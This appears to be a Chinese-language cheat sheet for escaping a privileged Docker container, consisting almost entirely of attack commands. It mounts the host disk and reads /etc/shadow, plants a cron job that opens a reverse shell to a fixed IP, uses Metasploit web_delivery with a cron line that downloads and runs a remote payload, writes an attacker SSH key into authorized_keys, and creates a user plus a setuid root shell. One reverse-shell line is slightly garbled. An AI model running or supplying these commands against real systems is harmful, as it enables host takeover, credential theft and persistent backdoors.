## 文章

[TWiKi](http://127.0.0.1:7777/CloudNative/)

https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html

https://zhuanlan.zhihu.com/p/90100140

## Privileged 特权模式容器逃逸

挂载磁盘

```bash
fdisk -l
mkdir /test && mount /dev/sda1 /test
cat /test/etc/shadow
```

写计划任务, 反弹shell

```bash
touch /test/tmp/test.sh

chmod +x /test/tmp/test.sh

ls -ll /test/tmp/test.sh

echo "#!/bin/bash" >> /test/tmp/test.sh

echo "/bin/bash -i >& bash -i >& /dev/tcp/192.168.43.130/9090 0>&1"  >> /test/tmp/test.sh

sed -i '$a*/2 *   * * *   root  bash /tmp/test.sh ' /test/etc/crontab

cat /test/etc/crontab
```

配合msf写计划任务2

```bash
use exploit/multi/script/web_delivery
set target 6    # 选择目标系统
set payload linux/x64/meterpreter/reverse_tcp
set lhost 192.168.1.7
set lport 4444
exploit

echo '*/1 * * * * wget -qO NQW1y7kP --no-check-certificate http://192.168.10.58:8080/EQF1163sH; chmod +x NQW1y7kP; ./NQW1y7kP& disown' >> /var/spool/cron/crontabs/root # Ubuntu计划任务目录
```

写 ssh 公钥

```bash
ssh-keygen -f hello
chmod 600 hello #赋予权限

cp -avx /hello/home/ubuntu/.ssh/id_rsa.pub /hello/home/ubuntu/.ssh/authorized_keys #-avx是将权限也一起复制

echo > /hello/home/ubuntu/.ssh/authorized_keys #清空authorized_keys文件

echo '生成的.pub文件的内容' > /hello/home/ubuntu/.ssh/authorized_keys #将ssh秘钥写入authorized_keys文件

cat /hello/home/ubuntu/.ssh/authorized_keys #查看是否写入成功

ssh -i hello ubuntu@192.168.52.20
```



加个用户，再给个suid shell

```bash
chroot /mnt adduser john
cp /bin/bash /tmp/shell
chmod u+s /tmp/shell
/tmp/shell -p
```

